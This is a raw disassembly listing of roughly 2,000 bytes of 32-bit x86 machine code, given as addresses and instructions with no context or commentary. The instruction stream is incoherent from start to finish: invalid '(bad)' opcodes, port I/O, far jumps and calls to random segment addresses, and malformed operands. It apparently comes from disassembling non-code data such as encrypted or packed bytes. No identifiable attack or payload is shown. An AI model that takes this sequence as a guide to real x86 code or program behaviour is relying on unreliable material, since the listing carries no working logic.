  408287:	or     DWORD PTR [edx+0x2aef68d8],0x2c
  40828e:	jecxz  0x4082b7
  408290:	or     edi,DWORD PTR [eax]
  408292:	inc    ebp
  408293:	lds    esp,FWORD PTR [esi+ecx*4]
  408296:	cmc    
  408297:	jns    0x4082cd
  408299:	gs jns 0x408297
  40829c:	(bad)  
  40829d:	xchg   edi,eax
  40829e:	std    
  40829f:	pop    edx
  4082a0:	or     BYTE PTR [esi],dh
  4082a2:	leave  
  4082a3:	sub    BYTE PTR [eax],dl
  4082a5:	pop    edx
  4082a6:	fcom   DWORD PTR [eax]
  4082a8:	push   eax
  4082a9:	out    dx,eax
  4082aa:	adc    eax,DWORD PTR [ecx+0x6474eaa7]
  4082b0:	cdq    
  4082b1:	arpl   sp,di
  4082b3:	jae    0x40825d
  4082b5:	and    eax,0xcbf8a66f
  4082ba:	sbb    al,0xbc
  4082bc:	std    
  4082bd:	push   0xc8abaa8d
  4082c2:	push   ebx
  4082c3:	jmp    0x408267
  4082c5:	cdq    
  4082c6:	dec    ebx
  4082c7:	mov    esi,0x2ffcc554
  4082cc:	jno    0x4082f3
  4082ce:	push   edx
  4082cf:	cdq    
  4082d0:	outs   dx,BYTE PTR gs:[esi]
  4082d2:	or     al,0x5b
  4082d4:	jno    0x40826d
  4082d6:	mov    ah,0xe0
  4082d8:	mov    ch,0x14
  4082da:	loop   0x4082a7
  4082dc:	daa    
  4082dd:	mov    eax,ds:0xd12579bc
  4082e2:	sbb    BYTE PTR [edx+0x70],0x39
  4082e6:	in     eax,dx
  4082e7:	popa   
  4082e8:	mov    ebp,0xb2c39ee4
  4082ed:	lea    esi,[edx-0x7f]
  4082f0:	xchg   esp,eax
  4082f1:	jle    0x408288
  4082f3:	inc    ebx
  4082f4:	jle    0x408326
  4082f6:	stos   DWORD PTR es:[edi],eax
  4082f7:	adc    BYTE PTR [edi-0x49560d2],0xe7
  4082fe:	push   0x2206e6a2
  408303:	inc    ecx
  408304:	push   esp
  408305:	jnp    0x4082b4
  408307:	sub    edx,DWORD PTR [eax]
  408309:	(bad)  
  40830a:	repnz enter 0xfe19,0x1b
  40830f:	mov    bl,0x10
  408311:	xchg   edx,eax
  408312:	push   esp
  408313:	scas   al,BYTE PTR es:[edi]
  408314:	(bad)  
  408315:	mov    ebp,0xa06ffdc0
  40831a:	inc    ebx
  40831b:	mov    ecx,0xc88b278a
  408320:	mov    esi,0xc4ab71d9
  408325:	adc    al,0xc9
  408328:	push   0xffffff8d
  40832a:	dec    edi
  40832b:	rcr    edi,cl
  40832d:	fs push esi
  40832f:	out    0xe9,eax
  408331:	pop    edi
  408332:	xor    al,0x5c
  408334:	shr    bl,cl
  408336:	dec    esp
  408337:	push   cs
  408338:	and    esp,DWORD PTR [edi]
  40833a:	mov    ?,WORD PTR [si]
  40833d:	imul   ebp,DWORD PTR ds:0xdcc5cd7a,0x2ca2bf04
  408347:	mov    ebx,0x13ca8d1a
  40834c:	mov    dl,0x22
  40834e:	pop    ss
  40834f:	push   esi
  408350:	out    dx,eax
  408351:	jo     0x408396
  408353:	jecxz  0x408324
  408355:	sub    ebp,DWORD PTR [esi+0x33]
  408358:	into   
  408359:	or     DWORD PTR [eax-0x4a5e6721],ecx
  40835f:	pushf  
  408360:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408361:	cmp    dh,BYTE PTR [edx]
  408363:	fmul   QWORD PTR [eax]
  408365:	pop    ebx
  408366:	int    0x2b
  408368:	loopne 0x40835e
  40836a:	dec    eax
  40836b:	push   ss
  40836c:	add    bh,dh
  40836e:	push   ss
  40836f:	mov    ch,0xa0
  408371:	push   ecx
  408372:	pushf  
  408373:	ja     0x408359
  408375:	adc    bl,BYTE PTR [ebx-0x18c74b66]
  40837b:	ja     0x4083d9
  40837d:	adc    edi,0xffffffaa
  408380:	lahf   
  408381:	pop    ds
  408382:	pop    ss
  408383:	cli    
  408384:	fistp  WORD PTR [esi]
  408386:	out    dx,al
  408387:	push   cs
  408388:	fwait
  408389:	test   al,0x38
  40838b:	inc    esi
  40838c:	jno    0x40833e
  40838e:	mov    ss,WORD PTR [ebp+0x4f9c4efc]
  408394:	add    esi,DWORD PTR [ebp-0x3f]
  408397:	mov    DWORD PTR [ebp-0x50ac9bc1],ebx
  40839d:	fcmovu st,st(4)
  40839f:	adc    bl,BYTE PTR [eax+0x7a]
  4083a2:	mov    esp,0x634dcdc4
  4083a7:	call   0xf19:0x6debb4c6
  4083ae:	es (bad) 
  4083b0:	jge    0x4083ed
  4083b2:	or     BYTE PTR [ecx-0x3c709402],cl
  4083b8:	xor    ch,BYTE PTR [ebx]
  4083ba:	int    0xf
  4083bc:	mov    dh,0x47
  4083be:	clc    
  4083bf:	out    0xd,eax
  4083c1:	sahf   
  4083c2:	jo     0x4083e2
  4083c4:	repnz fsub st,st(1)
  4083c7:	dec    eax
  4083c8:	out    0x6f,al
  4083ca:	in     al,0x35
  4083cc:	nop
  4083cd:	xor    DWORD PTR [esp+eax*8],0xfffffff2
  4083d1:	fild   QWORD PTR [edx]
  4083d3:	popa   
  4083d4:	jecxz  0x40835f
  4083d6:	js     0x4083a5
  4083d8:	xchg   esp,eax
  4083d9:	jns    0x4083d2
  4083db:	jnp    0x408444
  4083dd:	xchg   ebp,eax
  4083de:	out    dx,al
  4083df:	out    dx,al
  4083e0:	div    DWORD PTR [edx+0x19]
  4083e3:	inc    ebx
  4083e4:	repnz xor eax,0x3a2b654e
  4083ea:	cdq    
  4083eb:	iret   
  4083ec:	sbb    edi,edx
  4083ee:	cmp    DWORD PTR [ecx-0xe49937f],edi
  4083f4:	jbe    0x24d2c2ad
  4083fa:	xor    BYTE PTR [edx],al
  4083fc:	lea    esi,[edi+0x2b97bc12]
  408402:	in     al,0x9b
  408404:	add    BYTE PTR [ecx+0x65],0x2b
  408408:	js     0x4083f8
  40840a:	sbb    edx,DWORD PTR [ebx+0x15]
  40840d:	mov    al,0x51
  40840f:	test   eax,0x952f745d
  408414:	pop    edx
  408415:	mul    DWORD PTR ds:0x8ad2b32
  40841b:	push   0x27
  40841d:	mov    bh,0x3f
  40841f:	loope  0x408470
  408421:	cld    
  408422:	sub    al,0xc6
  408424:	jbe    0x408480
  408426:	stos   DWORD PTR es:[edi],eax
  408427:	daa    
  408428:	add    dl,dh
  40842a:	neg    DWORD PTR [edi+0x7f]
  40842d:	lea    edi,[ecx]
  40842f:	mov    ds:0xce289348,al
  408434:	sbb    al,0x7b
  408436:	das    
  408437:	xor    al,0x4e
  408439:	cmp    eax,0xc5d0c7a7
  40843e:	adc    ebx,0x8010fc6a
  408444:	xchg   edi,eax
  408445:	cmp    DWORD PTR [eax+0x57],esp
  408448:	adc    al,0x4a
  40844a:	inc    esi
  40844b:	xor    ch,dh
  40844d:	mov    edi,0x1c556305
  408452:	jg     0x408453
  408454:	xor    al,0x69
  408456:	push   eax
  408457:	call   0x1b46:0xb987c525
  40845e:	rcr    DWORD PTR [esi],cl
  408460:	fmul   DWORD PTR [edx+0x20]
  408463:	xchg   DWORD PTR [ebp-0x15c80ad],ecx
  408469:	in     eax,0xf6
  40846b:	xor    al,0x96
  40846d:	inc    edx
  40846e:	outs   dx,BYTE PTR ds:[esi]
  40846f:	das    
  408470:	cs repz das 
  408473:	rol    DWORD PTR [ebp+0x62],cl
  408476:	fisubr DWORD PTR [edx+0x16d09360]
  40847c:	mov    esp,0x45088586
  408481:	cmp    al,0x77
  408483:	jmp    0x516255ae
  408488:	pop    ss
  408489:	outs   dx,DWORD PTR ds:[esi]
  40848a:	xor    ch,BYTE PTR [edx*2+0x2e0a8d59]
  408491:	add    DWORD PTR [ebx+0x71a9cc42],ecx
  408497:	push   esi
  408498:	jge    0x408519
  40849a:	jge    0x408458
  40849c:	pop    edx
  40849d:	lods   eax,DWORD PTR ds:[esi]
  40849e:	pop    eax
  40849f:	inc    esp
  4084a0:	outs   dx,BYTE PTR ds:[esi]
  4084a1:	pop    esp
  4084a2:	gs outs dx,BYTE PTR ss:[esi]
  4084a5:	add    bl,BYTE PTR [eax+0x5fc947c2]
  4084ab:	inc    ebp
  4084ac:	aas    
  4084ad:	sbb    bl,BYTE PTR [ecx+0x1ffe6b9]
  4084b3:	fst    QWORD PTR [eax-0x129d5f31]
  4084b9:	in     eax,0xd0
  4084bb:	mov    eax,ds:0x60e5de7d
  4084c0:	push   cs
  4084c1:	sar    DWORD PTR ds:0x46a763fc,0xb8
  4084c8:	jne    0x408457
  4084ca:	dec    ecx
  4084cb:	iret   
  4084cc:	inc    edx
  4084cd:	pop    ebx
  4084ce:	xchg   esp,eax
  4084cf:	inc    ecx
  4084d0:	aaa    
  4084d1:	lahf   
  4084d2:	mov    dh,0x4c
  4084d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084d5:	ja     0x408541
  4084d7:	dec    eax
  4084d8:	dec    esp
  4084d9:	(bad)  
  4084da:	mov    esi,0x15de6493
  4084df:	(bad)  
  4084e0:	clc    
  4084e1:	fstp   DWORD PTR [eax+edx*2-0x58]
  4084e5:	inc    ebp
  4084e6:	jmp    0x4084d8
  4084e8:	push   ecx
  4084e9:	mov    ?,WORD PTR [eax]
  4084eb:	idiv   bl
  4084ed:	addr16 popa 
  4084ef:	sbb    al,0x46
  4084f1:	jp     0x408539
  4084f3:	mov    edx,0x1ed7f0fd
  4084f8:	sbb    esp,DWORD PTR [ecx-0x5194ffeb]
  4084fe:	std    
  4084ff:	sub    esp,DWORD PTR [ebp+0x6e006cae]
  408505:	inc    edi
  408506:	xchg   ecx,eax
  408507:	inc    ecx
  408508:	dec    esp
  408509:	daa    
  40850a:	xlat   BYTE PTR ds:[ebx]
  40850b:	adc    al,0x56
  40850d:	out    dx,al
  40850e:	cmc    
  40850f:	push   edi
  408510:	imul   BYTE PTR [esi]
  408512:	out    0x56,al
  408514:	mov    al,0xce
  408516:	pop    es
  408517:	addr16 inc esi
  408519:	fmul   DWORD PTR [edx]
  40851b:	mov    edx,0x6bbb3652
  408520:	push   cs
  408521:	inc    ecx
  408522:	shl    ecx,cl
  408524:	jmp    0xd63d:0x1fdc19
  40852b:	jb     0x408566
  40852d:	mov    ebp,0x221a4e7b
  408532:	gs cmc 
  408534:	push   ds
  408535:	scas   eax,DWORD PTR es:[edi]
  408536:	mov    al,ds:0x8dc7d460
  40853b:	std    
  40853c:	add    BYTE PTR [ebx],al
  40853e:	loopne 0x4085bd
  408540:	imul   eax,DWORD PTR [ecx+0xa],0x0
  408544:	cmc    
  408545:	inc    eax
  408546:	loopne 0x408559
  408548:	sub    cl,BYTE PTR [edi]
  40854a:	xor    BYTE PTR [edx+0x54],bl
  40854d:	fild   QWORD PTR [eax+eiz*4]
  408550:	xchg   ebp,eax
  408551:	inc    esp
  408552:	(bad)  
  408553:	out    0x8d,eax
  408555:	nop
  408556:	add    BYTE PTR [edx-0x2a],ah
  408559:	out    0xce,al
  40855b:	xchg   ecx,eax
  40855c:	pop    es
  40855d:	jb     0x40855b
  40855f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408560:	inc    ecx
  408561:	sbb    al,BYTE PTR [edi+eax*4+0x7a52e5c4]
  408568:	mov    al,0xb5
  40856a:	enter  0x8975,0xf9
  40856e:	out    dx,eax
  40856f:	cmp    esi,DWORD PTR [ebx-0xe]
  408572:	loope  0x408556
  408574:	pop    eax
  408575:	xor    al,0x96
  408577:	or     ecx,esp
  408579:	push   edx
  40857a:	leave  
  40857b:	dec    edi
  40857c:	push   ebx
  40857d:	pop    ebp
  40857e:	in     al,0xa8
  408580:	ds add ebx,ecx
  408583:	mov    dh,ch
  408585:	scas   al,BYTE PTR es:[edi]
  408586:	xchg   ebx,eax
  408587:	daa    
  408588:	in     al,0x26
  40858a:	push   ds
  40858b:	sbb    al,0x3e
  40858d:	xlat   BYTE PTR ds:[ebx]
  40858e:	lock dec eax
  408590:	pop    ebx
  408591:	adc    al,0x7d
  408593:	and    esp,ecx
  408595:	out    0x2,al
  408597:	ret    
  408598:	push   esi
  408599:	pop    edx
  40859a:	and    DWORD PTR [edx+0x92405f8],0x8a4e093
  4085a4:	mov    BYTE PTR [ecx],al
  4085a6:	jmp    0x4088f3
  4085ab:	inc    edi
  4085ac:	cli    
  4085ad:	fisttp DWORD PTR [edx+0x517569e1]
  4085b3:	jp     0x40858b
  4085b5:	xchg   ecx,eax
  4085b6:	mov    edx,0x31834201
  4085bb:	out    0xdf,eax
  4085bd:	jo     0x40862f
  4085bf:	and    BYTE PTR [ebp+0x70],bh
  4085c2:	jo     0x4085e9
  4085c4:	mov    WORD PTR [ecx+0x70],es
  4085c7:	sbb    DWORD PTR [edi],edx
  4085c9:	dec    esi
  4085ca:	jecxz  0x408620
  4085cc:	mov    DWORD PTR [edx+ecx*2-0xc],edi
  4085d0:	in     eax,0x92
  4085d2:	xchg   dl,ch
  4085d4:	push   es
  4085d5:	sbb    al,0x48
  4085d7:	mov    ds:0x99e2bc7,eax
  4085dc:	xchg   DWORD PTR [ebp-0x1b51f2a2],ebp
  4085e2:	jb     0x40861d
  4085e4:	stc    
  4085e5:	addr16 adc ch,ah
  4085e8:	fimul  WORD PTR [eax]
  4085ea:	arpl   WORD PTR [esi-0x36],si
  4085ed:	das    
  4085ee:	ins    DWORD PTR es:[edi],dx
  4085ef:	mov    ch,0xc7
  4085f1:	inc    esi
  4085f2:	xchg   esi,eax
  4085f3:	lahf   
  4085f4:	mov    edx,0xf1389d03
  4085f9:	retf   0x9657
  4085fc:	mov    ch,0xc0
  4085fe:	adc    cl,BYTE PTR [ecx+0x59]
  408601:	and    DWORD PTR [edx],ebx
  408603:	cvtps2pd xmm3,xmm3
  408606:	push   edx
  408607:	jg     0x408645
  408609:	pop    edi
  40860a:	or     BYTE PTR [eax+edi*4-0x416bf4f6],cl
  408611:	cld    
  408612:	and    BYTE PTR [ebx-0x59],al
  408615:	retf   0x60b4
  408618:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408619:	inc    ecx
  40861a:	outs   dx,BYTE PTR ds:[esi]
  40861b:	lahf   
  40861c:	pop    es
  40861d:	popf   
  40861e:	xchg   ebx,ecx
  408620:	sbb    esi,DWORD PTR [ecx]
  408622:	addr16 xchg esp,eax
  408624:	gs in  al,dx
  408626:	mov    bl,0xd3
  408628:	setp   BYTE PTR [ebx-0x2e]
  40862c:	xor    eax,0x8230e3bf
  408631:	sub    bl,BYTE PTR [edi-0x3c0fddcb]
  408637:	paddusb mm0,QWORD PTR es:[ebp-0x2f7c13c4]
  40863f:	test   bh,dh
  408641:	mov    eax,ds:0xa237fb4f
  408646:	shr    BYTE PTR [edi+0x7970b306],1
  40864c:	xlat   BYTE PTR ds:[ebx]
  40864d:	dec    edi
  40864e:	xor    ebp,ecx
  408650:	clc    
  408651:	scas   eax,DWORD PTR es:[edi]
  408652:	pop    edi
  408653:	ret    0xfede
  408656:	test   DWORD PTR [edi+0x37],edx
  408659:	call   DWORD PTR [eax+0x63]
  40865c:	outs   dx,BYTE PTR ds:[esi]
  40865d:	(bad)  
  40865f:	push   es
  408660:	xor    esi,edi
  408662:	sahf   
  408663:	jbe    0x408638
  408665:	sbb    DWORD PTR ds:[ebx-0x69],esi
  408669:	outs   dx,DWORD PTR ds:[esi]
  40866a:	lods   al,BYTE PTR ds:[esi]
  40866b:	leave  
  40866c:	retf   0xb389
  40866f:	mov    DWORD PTR [edx],0x83fd2087
  408675:	in     al,dx
  408676:	int    0xef
  408678:	jg     0x4086e3
  40867a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40867b:	ja     0x4086e8
  40867d:	mov    ah,0x45
  40867f:	and    edx,ebx
  408681:	loopne 0x4086e0
  408683:	jle    0x408615
  408685:	aad    0x21
  408687:	and    BYTE PTR [ebx],bl
  408689:	xchg   edi,eax
  40868a:	add    BYTE PTR [ecx-0xb1e5a34],0xb1
  408691:	in     eax,0xdf
  408693:	dec    edi
  408694:	xlat   BYTE PTR ds:[ebx]
  408695:	xor    cx,WORD PTR [edx]
  408698:	xor    eax,0xee970f32
  40869d:	out    dx,al
  40869e:	stos   BYTE PTR es:[edi],al
  40869f:	mov    eax,0xe509a2fa
  4086a4:	loopne 0x40868a
  4086a6:	xor    eax,0x9e38e33c
  4086ab:	(bad)  
  4086ad:	lods   al,BYTE PTR ds:[esi]
  4086ae:	sub    eax,0x50309a61
  4086b3:	clc    
  4086b4:	lahf   
  4086b5:	popf   
  4086b6:	data16 int3 
  4086b8:	xchg   ecx,eax
  4086b9:	nop
  4086ba:	pop    ebx
  4086bb:	xchg   edx,eax
  4086bc:	out    dx,eax
  4086bd:	push   esi
  4086be:	stc    
  4086bf:	and    ebp,DWORD PTR [ebp-0x33439cbf]
  4086c5:	push   ebx
  4086c6:	pop    ebp
  4086c7:	pop    esi
  4086c8:	mov    cl,0x72
  4086ca:	nop
  4086cb:	shl    DWORD PTR [edi],0xd2
  4086ce:	cmp    DWORD PTR [ebx-0x65],eax
  4086d1:	inc    esp
  4086d2:	dec    edi
  4086d3:	sbb    DWORD PTR [ecx+0xf],0xffffffb4
  4086d7:	sbb    ah,BYTE PTR [ebx+0x9571c6d]
  4086dd:	mov    esp,0x3a820137
  4086e2:	out    dx,eax
  4086e3:	pop    es
  4086e4:	stos   DWORD PTR es:[edi],eax
  4086e5:	pop    ss
  4086e6:	push   edi
  4086e7:	loopne 0x4086e3
  4086e9:	adc    DWORD PTR [edi+0x212e22ed],edi
  4086ef:	mov    esp,0xb36268f1
  4086f4:	call   0xcf85:0x15c69c3b
  4086fb:	push   eax
  4086fc:	arpl   WORD PTR [esi],sp
  4086fe:	rol    eax,0x8c
  408701:	int3   
  408702:	sub    edx,ebx
  408704:	idiv   DWORD PTR [ecx]
  408706:	xchg   esp,eax
  408707:	dec    ecx
  408708:	and    bl,BYTE PTR [edx-0x6facbdda]
  40870e:	mov    dh,0x5d
  408710:	push   ebp
  408711:	leave  
  408712:	and    bl,dh
  408714:	or     ch,al
  408716:	pop    ebp
  408717:	jo     0x4086d1
  408719:	jmp    0xa195961c
  40871e:	adc    esi,esp
  408720:	adc    esi,DWORD PTR [esi]
  408722:	leave  
  408723:	test   al,0x5
  408725:	add    esp,0xffffffda
  408728:	adc    al,0xc5
  40872a:	inc    esp
  40872b:	in     al,0xb2
  40872d:	pushf  
  40872e:	outs   dx,DWORD PTR ds:[esi]
  40872f:	retf   0x5d86
  408732:	ss int3 
  408734:	xor    BYTE PTR ds:0x887ce395,0x68
  40873b:	sar    bh,cl
  40873d:	mov    dh,0x3
  40873f:	pop    ebx
  408740:	mov    DWORD PTR [eax],ecx
  408742:	stos   BYTE PTR es:[edi],al
  408743:	inc    edx
  408744:	outs   dx,BYTE PTR ds:[esi]
  408745:	xchg   ebx,eax
  408746:	cmp    ch,BYTE PTR [eax]
  408748:	push   eax
  408749:	push   eax
  40874a:	add    eax,0x70d58102
  40874f:	xchg   ecx,eax
  408750:	int    0xde
  408752:	lods   eax,DWORD PTR ds:[esi]
  408753:	pop    edx
  408754:	adc    al,dl
  408756:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408757:	aam    0x63
  408759:	cmp    DWORD PTR [edx-0x3b],ebp
  40875c:	std    
  40875d:	jecxz  0x4086f4
  40875f:	sub    eax,DWORD PTR [esi]
  408761:	dec    esp
  408762:	and    edi,eax
  408764:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408765:	pop    edx
  408766:	repnz mov bl,0xe6
  408769:	cmp    ebp,0x6e
  40876c:	pop    edx
  40876d:	int    0x8b
  40876f:	xchg   edx,eax
  408770:	arpl   ax,di
  408772:	jp     0x408795
  408774:	inc    ebp
  408775:	xchg   edx,eax
  408776:	mov    esp,0xf7100378
  40877b:	inc    edx
  40877c:	mov    eax,0x2cd2caaa
  408781:	push   esp
  408782:	add    al,0x20
  408784:	daa    
  408785:	sub    al,0x51
  408787:	aas    
  408788:	add    DWORD PTR [edx+ebx*4],ecx
  40878b:	pop    es
  40878c:	or     DWORD PTR [esi+0x41],ebp
  40878f:	mov    dh,cl
  408791:	dec    edi
  408792:	jmp    0x21ca:0x1dda1862
  408799:	js     0x408798
  40879b:	mov    edi,0xa64b9066
  4087a0:	rcr    esp,cl
  4087a2:	mov    al,ds:0x5fc8dceb
  4087a7:	retf   
  4087a8:	or     ebp,DWORD PTR gs:[esi-0x23]
  4087ac:	aad    0x6b
  4087ae:	add    al,al
  4087b0:	dec    ebx
  4087b1:	cli    
  4087b2:	mov    ebx,DWORD PTR [ecx-0x59ebce1e]
  4087b8:	pusha  
  4087b9:	pop    edx
  4087ba:	mov    al,ds:0x925d4355
  4087bf:	sub    al,0x78
  4087c1:	mov    BYTE PTR [ecx-0x4c],dh
  4087c4:	jle    0x408756
  4087c6:	dec    edx
  4087c7:	push   edi
  4087c8:	dec    edx
  4087c9:	mov    ds:0xf106bdd5,al
  4087ce:	repnz bound ebp,QWORD PTR [ebp-0x2a]
  4087d2:	gs and esi,esp
  4087d5:	or     ecx,ebp
  4087d7:	sub    BYTE PTR [esi],dh
  4087d9:	adc    ebp,DWORD PTR [esi]
  4087db:	or     ch,BYTE PTR [esi+0x3d]
  4087de:	test   BYTE PTR [ecx-0x4c174c4e],dl
  4087e4:	sub    DWORD PTR [ecx+0x74],edx
  4087e7:	xor    edx,DWORD PTR [esi-0x67aa71da]
  4087ed:	add    eax,0xaff4874a
  4087f2:	mov    ecx,0x438476ec
  4087f7:	pop    ss
  4087f8:	pusha  
  4087f9:	inc    ebp
  4087fa:	pop    es
  4087fb:	fcom   DWORD PTR [edi-0x415cc04]
  408801:	rcl    DWORD PTR [esi+0x54],cl
  408804:	pop    eax
  408805:	ret    0x610c
  408808:	pop    esi
  408809:	pop    esi
  40880a:	loope  0x4087a2
  40880c:	cmp    eax,DWORD PTR [edi+0x1f6c98b9]
  408812:	mov    ah,0x3b
  408814:	inc    ebp
  408815:	pop    esp
  408816:	jne    0x40883a
  408818:	ror    dl,0xab
  40881b:	(bad)  
  40881c:	sub    BYTE PTR [ebx+0x5f5bc1e2],ah
  408822:	push   ecx
  408823:	fs jge 0x4087bb
  408826:	or     al,0x7c
  408828:	jp     0x4087f0
  40882a:	push   ecx
  40882b:	mov    bl,0x93
  40882d:	push   ds
  40882e:	inc    ebx
  40882f:	fdivr  st,st(2)
  408831:	inc    edi
  408832:	sbb    ah,ch
  408834:	lahf   
  408835:	in     al,dx
  408836:	jno    0x408845
  408838:	daa    
  408839:	sbb    eax,0x484236f8
  40883e:	pop    esp
  40883f:	rcl    bh,1
  408841:	test   al,0x1b
  408843:	dec    eax
  408844:	fwait
  408845:	imul   esi,eax,0xffffffba
  408848:	pop    ebx
  408849:	ret    
  40884a:	lock shl BYTE PTR [eax],0x2f
  40884e:	add    edx,DWORD PTR [ecx+0x5e]
  408851:	(bad)  
  408852:	mov    bh,0x8d
  408854:	arpl   WORD PTR [esi+0x77],bx
  408857:	push   ebp
  408858:	xchg   esp,eax
  408859:	ins    BYTE PTR es:[edi],dx
  40885a:	pop    es
  40885b:	pop    esi
  40885c:	xlat   BYTE PTR ds:[ebx]
  40885d:	mov    ds:0xdd6aeda1,al
  408862:	lods   al,BYTE PTR ds:[esi]
  408863:	push   es
  408864:	push   cs
  408865:	sbb    ecx,eax
  408867:	inc    eax
  408868:	retf   0x978e
  40886b:	lods   eax,DWORD PTR ds:[esi]
  40886c:	mov    bl,0xe0
  40886e:	dec    ecx
  40886f:	cmp    BYTE PTR [ebp-0x51e8528e],dh
  408875:	jnp    0x4088c1
  408877:	mov    esi,0xf9f47c60
  40887c:	jno    0x40883e
  40887e:	cmp    al,0x20
  408880:	mov    dh,BYTE PTR [ebx+0x0]
  408883:	ja     0x4088f4
  408885:	loop   0x40880a
  408887:	daa    
  408888:	mov    ebp,0xc6f8309d
  40888d:	mov    ah,0xbc
  40888f:	inc    esi
  408890:	call   0x8c4b:0x9a83cd8f
  408897:	and    esp,DWORD PTR [ebx-0xb]
  40889a:	inc    bl
  40889c:	(bad)  
  40889d:	and    DWORD PTR [edx],esp
  40889f:	push   edi
  4088a0:	mov    bl,0xec
  4088a2:	(bad)  
  4088a5:	mov    esp,0x8842ac4a
  4088aa:	dec    eax
  4088ab:	mov    esp,0x5aa8af65
  4088b0:	cmp    al,BYTE PTR [edi+0xb]
  4088b3:	inc    edx
  4088b4:	sub    BYTE PTR [ebp+0x5e],al
  4088b7:	adc    ebx,eax
  4088b9:	xor    DWORD PTR [edi-0x1d],edi
  4088bc:	es xor eax,edx
  4088bf:	adc    eax,0x25222dec
  4088c4:	add    DWORD PTR ds:0xd48467c4,0x898469b2
  4088ce:	ror    BYTE PTR [esi+0x39],cl
  4088d1:	jp     0x4088f2
  4088d3:	je     0x408855
  4088d5:	das    
  4088d6:	mov    ?,ecx
  4088d8:	push   esi
  4088d9:	add    eax,DWORD PTR [eax+0x751a9dc]
  4088df:	xchg   ebx,eax
  4088e0:	mov    bl,0xc7
  4088e2:	inc    esp
  4088e3:	fist   WORD PTR [esi+0x12]
  4088e6:	mov    edx,0xf382301b
  4088eb:	int3   
  4088ec:	mov    gs,edi
  4088ee:	mov    dh,0x48
  4088f0:	stos   BYTE PTR es:[edi],al
  4088f1:	xchg   edi,eax
  4088f2:	test   BYTE PTR [ebp+0xfef845],cl
  4088f8:	inc    eax
  4088f9:	push   eax
  4088fa:	jmp    0x408c47
  4088ff:	mov    al,0x3c
  408901:	fwait
  408902:	xchg   ebx,eax
  408903:	fwait
  408904:	jae    0x40896e
  408906:	rol    DWORD PTR [ebp+0x435cff],cl
  40890c:	lds    edi,FWORD PTR [esp+eiz*2]
  40890f:	xchg   edi,eax
  408910:	fdiv   QWORD PTR [eax+0x70]
  408913:	and    BYTE PTR [ebp+0x70],bh
  408916:	jo     0x408925
  408918:	and    BYTE PTR [edx],cl
  40891a:	jge    0x40896d
  40891c:	jnp    0x408947
  40891e:	xor    eax,0x7a191ccb
  408923:	xchg   ebx,eax
  408924:	fxch   st(7)
  408926:	add    eax,0x45d5c24a
  40892b:	pop    edx
  40892c:	pop    es
  40892d:	leave  
  40892e:	scas   al,BYTE PTR es:[edi]
  40892f:	dec    ebx
  408930:	inc    eax
  408931:	retf   
  408932:	iret   
  408933:	imul   edi,DWORD PTR [eax+0x1b],0xee064bfd
  40893a:	xchg   DWORD PTR [eax-0x38f7208a],edi
  408940:	xor    DWORD PTR [ebx+0x21098194],ebx
  408946:	jg     0x4088ce
  408948:	aad    0x2a
  40894a:	and    eax,0x5212e5c9
  40894f:	mov    eax,0x456d2461
  408954:	cmp    DWORD PTR ds:0xf83fd50c,ebp
  40895a:	or     eax,0x2c1e95eb
  40895f:	cld    
  408960:	jmp    0xdccb:0x379731e2
  408967:	mov    ds:0x2fd26741,eax
  40896c:	xchg   edi,eax
  40896d:	cmp    ecx,0x67
  408970:	in     al,dx
  408971:	ret    
  408972:	mov    esp,0xdd163831
  408977:	xor    bl,cl
  408979:	jmp    0x5529:0x29f679b
  408980:	inc    esp
  408981:	bound  esi,QWORD PTR [edx+0x61]
  408984:	mov    dh,0x92
  408986:	cld    
  408987:	(bad)  
  408988:	lahf   
  408989:	cmp    BYTE PTR [edx+ecx*4-0x5d4ed4e9],cl
  408990:	mov    ds:0xc4ff0ab7,eax
  408995:	hlt    
  408996:	jmp    0x408979
  408998:	shl    BYTE PTR [eax-0x67451f8b],1
  40899e:	push   esi
  40899f:	xchg   ebx,eax
  4089a0:	pop    es
  4089a1:	retf   0xed04
  4089a4:	leave  
  4089a5:	gs pop esp
  4089a7:	cmp    al,0x49
  4089a9:	push   edx
  4089ab:	cmp    al,0xf6
  4089ad:	and    BYTE PTR [ebp-0x3a6e3990],cl
  4089b3:	adc    al,0xf1
  4089b5:	fld    DWORD PTR [ebp+0x469a91f7]
  4089bb:	out    dx,eax
  4089bc:	sub    eax,0x1c7b1307
  4089c1:	or     al,0xa8
  4089c3:	jmp    0x796c3f3b
  4089c8:	or     al,dh
  4089ca:	gs je  0x408990
  4089cd:	jae    0x4089b0
  4089cf:	jge    0x4089d1
  4089d1:	push   ebp
  4089d2:	jns    0x4089a8
  4089d4:	push   0xc076f6bf
  4089d9:	scas   eax,DWORD PTR es:[edi]
  4089da:	retf   0x5909
  4089dd:	jle    0x4089f5
  4089df:	pop    ds
  4089e0:	push   0x70ecc729
  4089e5:	pop    esp
  4089e6:	pop    edx
  4089e7:	mov    BYTE PTR [esi+eiz*4+0x51],ah
  4089eb:	rcl    BYTE PTR [ebx],1
  4089ed:	out    dx,al
  4089ee:	dec    esi
  4089ef:	xchg   ebx,eax
  4089f0:	mov    bl,0xc3
  4089f2:	and    eax,0x35092a0e
  4089f7:	sbb    eax,0xad9d0e97
  4089fc:	cmp    DWORD PTR [esp+ebp*4],0xb6127d9d
  408a03:	call   0xfa1b:0x69012892
  408a0a:	mov    ch,0x12
  408a0c:	hlt    
  408a0d:	or     eax,0x481b96c9
  408a12:	js     0x4089a8
  408a14:	sbb    ebp,ebp
  408a16:	loope  0x408a86
  408a18:	dec    ecx
  408a19:	xor    al,0x14
  408a1b:	cs pop eax
  408a1d:	push   ecx
  408a1e:	xor    edx,DWORD PTR [ebx+0x4eabee8d]
  408a24:	xchg   esp,eax
  408a25:	cmp    DWORD PTR [eax],edx
  408a27:	fwait
  408a28:	arpl   WORD PTR ds:0x3711845c,cx
  408a2e:	mov    ah,0x6d
  408a30:	fist   WORD PTR [edx-0xce02cad]
  408a36:	int3   
  408a37:	pop    eax
  408a38:	or     ebx,DWORD PTR [ecx]
  408a3a:	fiadd  WORD PTR [ebp-0x610378e4]
  408a40:	test   eax,0xf3e107e0
  408a45:	lahf   
  408a46:	adc    edx,DWORD PTR [esi-0xf4bd0ce]
